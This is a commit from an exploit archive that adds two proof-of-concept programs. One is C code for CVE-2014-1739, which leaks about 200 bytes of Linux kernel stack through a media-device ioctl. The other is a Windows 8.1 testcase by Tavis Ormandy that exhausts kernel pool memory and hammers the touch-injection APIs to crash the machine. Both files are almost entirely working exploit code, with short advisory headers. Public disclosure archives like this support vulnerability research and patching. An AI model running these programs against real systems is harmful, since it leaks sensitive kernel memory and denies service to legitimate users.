6894064148ab71d953c66a9cc262db77f81b4f0a
Offensive Security <info@exploit-db.com>
2016-01-11 05:03:03 +0000

    DB: 2016-01-11
    10 new exploits

---
+++ platforms/linux/local/39214.c
@@ -0,0 +1,60 @@
+source: http://www.securityfocus.com/bid/68048/info
+
+The Linux kernel is prone to a local information-disclosure vulnerability.
+
+Local attackers can exploit this issue to cause a memory leak to obtain sensitive information that may lead to further attacks.
+
+Linux kernel 2.6.38 through 3.15-rc2 are vulnerable. 
+
+/*
+ * $File: media-enum-poc.c
+ * $Description: CVE-2014-1739: Infoleak PoC in media_device_enum_entities() leaking 200 kstack bytes on x86_32.
+ * $Author: Salva Peiró <speirofr@gmail.com> (c) Copyright 2014.
+ * $URL: http://speirofr.appspot.com/files/media-enum-poc.c
+ * $License: GPLv2.
+ */
+
+#include <stdio.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdint.h>
+
+#include <sys/ioctl.h>
+#include <linux/media.h>
+#define MEDIA_DEV "/dev/media0"
+
+int main(int argc, char *argv[])
+{
+    struct media_entity_desc u_ent = {};
+    char *file = MEDIA_DEV;
+    int i, fd, ret;
+
+    if (argc > 1)
+        file = argv[1];
+    fd = open(file, O_RDONLY);
+    if (fd < 0){
+        perror("open " MEDIA_DEV);
+        return -1;
+    }
+
+    u_ent.id = 0 | MEDIA_ENT_ID_FLAG_NEXT;
+    ret=ioctl(fd, MEDIA_IOC_ENUM_ENTITIES, &u_ent);
+    if (ret < 0){
+        perror("ioctl " MEDIA_DEV);
+        return -1;
+    }
+
+    printf("[*] CVE-2014-1739: Infoleak PoC in media_device_enum_entities() leaking %d kstack bytes:", sizeof(u_ent.reserved) + sizeof(u_ent.raw));
+    for (i = 0; i < 200/sizeof(uint32_t); i++) {
+        uint32_t data = *(uint32_t*)((uint32_t*)&u_ent.reserved+i);
+        if (i % 4 == 0)
+            printf("\n    %08d: ", i);
+        printf("0x%08x ", data);
+    }
+    printf("\n");
+
+    return ret;
+}
+
+/*
+ gcc -Wall -g -m32 media-enum-poc.c -o media-enum-poc # */
---
+++ platforms/windows/dos/39208.c
@@ -0,0 +1,80 @@
+source: http://www.securityfocus.com/bid/67742/info
+
+Microsoft Windows is prone to a local denial-of-service vulnerability.
+
+A local attacker can exploit this issue to crash the affected computer, denying service to legitimate users. 
+
+#ifndef WIN32_NO_STATUS
+# define WIN32_NO_STATUS
+#endif
+#include <windows.h>
+#include <assert.h>
+#include <stdio.h>
+#include <winerror.h>
+#include <winternl.h>
+#include <stddef.h>
+#include <winnt.h>
+#ifdef WIN32_NO_STATUS
+# undef WIN32_NO_STATUS
+#endif
+#include <ntstatus.h>
+ 
+#pragma comment(lib, "ntdll")
+#pragma comment(lib, "user32")
+#pragma comment(lib, "gdi32")
+#pragma comment(lib, "advapi32")
+ 
+// InitializeTouchInjection() Win8.1 Testcase
+// -- Tavis Ormandy <taviso@google.com>, Feb 2014.
+ 
+int main(int argc, char **argv)
+{
+POINTER_TOUCH_INFO Contact;
+SID_AND_ATTRIBUTES SidToRestricted;
+ULONG Size;
+HANDLE Handle;
+ 
+ZeroMemory(&Contact, sizeof Contact);
+ZeroMemory(&SidToRestricted, sizeof SidToRestricted);
+ 
+// I *think* TOUCH_MASK_CONTACTAREA is required (i.e. rcContact), the rest
+// just need to be valid.
+Contact.pointerInfo.pointerType = PT_TOUCH;
+Contact.pointerInfo.pointerFlags = POINTER_FLAG_DOWN | POINTER_FLAG_INRANGE | POINTER_FLAG_INCONTACT;
+Contact.pointerInfo.ptPixelLocation.x = 'AAAA';
+Contact.pointerInfo.ptPixelLocation.y = 'AAAA';
+Contact.rcContact.left = 'AAAA';
+Contact.rcContact.right = 'AAAA';
+Contact.rcContact.top = 'AAAA';
+Contact.rcContact.bottom = 'AAAA';
+Contact.touchFlags = TOUCH_FLAG_NONE;
+Contact.touchMask = TOUCH_MASK_CONTACTAREA;
+Size = SECURITY_MAX_SID_SIZE;
+Handle = INVALID_HANDLE_VALUE;
+SidToRestricted.Sid = _alloca(Size);
+ 
+CreateWellKnownSid(WinNullSid, NULL, SidToRestricted.Sid, &Size);
+ 
+// This just exhausts available pool (how that's accomplished is irrelevant).
+for (Size = 1 << 26; Size; Size >>= 1) {
+while (CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
+;
+}
+ 
+for (;;) {
+// Initialize touch injection with very small number of contacts.
+InitializeTouchInjection(1, TOUCH_FEEDBACK_DEFAULT);
+ 
+// Now increase the number of contacts, which should (eventually) cause an allocation fail.
+InitializeTouchInjection(MAX_TOUCH_COUNT, TOUCH_FEEDBACK_DEFAULT);
+ 
+// I think this will just massage the pool, sequence found by fuzzing.
+OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &Handle);
+CreateRestrictedToken(Handle, 0, 0, NULL, 0, NULL, 1, &SidToRestricted, &Handle);
+ 
+// Write something to the touch injection allocation.
+InjectTouchInput(1, &Contact);
+}
+ 
+return 0;
+}
